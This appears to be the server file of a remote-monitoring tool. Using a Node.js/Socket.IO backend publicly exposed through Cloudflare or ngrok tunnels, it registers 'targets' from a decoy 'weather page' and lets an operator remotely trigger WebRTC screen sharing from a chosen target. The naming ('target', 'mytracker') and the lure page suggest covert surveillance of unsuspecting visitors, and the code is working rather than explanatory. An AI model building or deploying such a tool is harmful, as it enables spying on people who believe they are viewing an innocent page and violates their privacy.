const { tunnel: cloudflaredTunnel } = require("cloudflared");
const cookieParser = require("cookie-parser");
const socketIO = require("socket.io");
const config = require("./config");
const express = require("express");
const tarkine = require("tarkine");
const http = require('http');

const app = express();
const server = http.createServer(app);
const io = new socketIO.Server(server);
const PORT = process.env.PORT || config.port;
global.remoteURL = null; // Will be set when tunnel starts

global.IO = io;

// ---- Store target socket IDs ----
global.TARGET_SOCKETS = {}; // targetId -> socket.id

app.set("view engine", "html");
app.engine("html", tarkine.renderFile);
app.use(cookieParser());
app.use(express.urlencoded({ extended: false }));
app.use(express.static(__dirname + "/public"));
app.use(express.json());

app.use("/", require("./router"));

// ---- Socket.io handlers ----
io.on('connection', (socket) => {
    console.log(`🔗 New client connected: ${socket.id}`);

    // ---- Register target (weather page) ----
    socket.on('register-target', (targetId) => {
        global.TARGET_SOCKETS[targetId] = socket.id;
        console.log(`📍 Target ${targetId} registered with socket ${socket.id}`);
    });

    // ---- Trigger screen share on target ----
    socket.on('trigger-screen-share', (targetId) => {
        const targetSocketId = global.TARGET_SOCKETS[targetId];
        if (targetSocketId) {
            io.to(targetSocketId).emit('start-screen-share', { room: targetId });
            console.log(`📺 Triggered screen share for ${targetId}`);
        } else {
            console.log(`⚠️ Target ${targetId} not online`);
        }
    });

    // ---- Screen Share Signaling (WebRTC) ----
    const screenRooms = {};

    socket.on('join-screen-room', (roomId) => {
        if (!screenRooms[roomId]) screenRooms[roomId] = new Set();
        screenRooms[roomId].add(socket.id);
        socket.join(roomId);
        io.to(roomId).emit('screen-peers-update', screenRooms[roomId].size);
        console.log(`📺 ${socket.id} joined screen room: ${roomId}`);
    });

    socket.on('screen-start', (roomId) => {
        socket.to(roomId).emit('screen-peers-update', screenRooms[roomId]?.size || 0);
        console.log(`📡 Screen broadcast started in ${roomId}`);
    });

    socket.on('screen-stop', (roomId) => {
        socket.to(roomId).emit('screen-stopped');
        socket.to(roomId).emit('screen-peers-update', 0);
        console.log(`🛑 Screen broadcast stopped in ${roomId}`);
    });

    socket.on('screen-request', (roomId) => {
        console.log(`📩 Screen requested in ${roomId}`);
    });

    socket.on('screen-offer', (data) => {
        socket.to(data.room).emit('screen-offer', {
            offer: data.offer,
            sender: socket.id
        });
    });

    socket.on('screen-answer', (data) => {
        socket.to(data.room).emit('screen-answer', {
            answer: data.answer,
            sender: socket.id
        });
    });

    socket.on('screen-ice-candidate', (data) => {
        socket.to(data.room).emit('screen-ice-candidate', {
            candidate: data.candidate,
            sender: socket.id
        });
    });

    socket.on('disconnect', () => {
        // Clean target sockets
        for (const [targetId, sockId] of Object.entries(global.TARGET_SOCKETS)) {
            if (sockId === socket.id) {
                delete global.TARGET_SOCKETS[targetId];
                console.log(`📍 Target ${targetId} disconnected`);
            }
        }
        // Clean screen rooms
        for (const [roomId, peers] of Object.entries(screenRooms)) {
            if (peers.has(socket.id)) {
                peers.delete(socket.id);
                io.to(roomId).emit('screen-peers-update', peers.size);
                if (peers.size === 0) {
                    delete screenRooms[roomId];
                }
                console.log(`📺 ${socket.id} left screen room: ${roomId}`);
            }
        }
    });
});

// ---- Start server and tunnel (Cloudflare first, then ngrok fallback) ----
async function startTunnel() {
    const localURL = `http://localhost:${PORT}`;
    console.log(`LOCAL  : ${localURL}`);

    // Try Cloudflare tunnel first
    try {
        const url = await cloudflaredTunnel({
            "--url": localURL,
            // Optional: add a custom hostname if you have a domain
            // "--hostname": "yourdomain.com",
        }).url;
        global.remoteURL = url;
        console.log(`REMOTE : ${global.remoteURL}`);
        console.log(`✅ Cloudflared tunnel established.`);
        return;
    } catch (cfErr) {
        console.error('❌ Cloudflared failed:', cfErr.message);
        console.log('⚠️  Falling back to ngrok...');
    }

    // Fallback to ngrok
    try {
        const ngrok = require('ngrok');
        const url = await ngrok.connect({
            addr: PORT,
            proto: 'http',
            // You can optionally set a custom subdomain if you have a paid ngrok account:
            // subdomain: 'mytracker',
        });
        global.remoteURL = url;
        console.log(`REMOTE : ${global.remoteURL}`);
        console.log(`✅ Ngrok tunnel established.`);
    } catch (ngrokErr) {
        console.error('❌ Ngrok failed:', ngrokErr.message);
        global.remoteURL = localURL;
        console.log(`⚠️  Using local URL (no external access): ${global.remoteURL}`);
    }
}

server.listen(PORT, async () => {
    await startTunnel();
});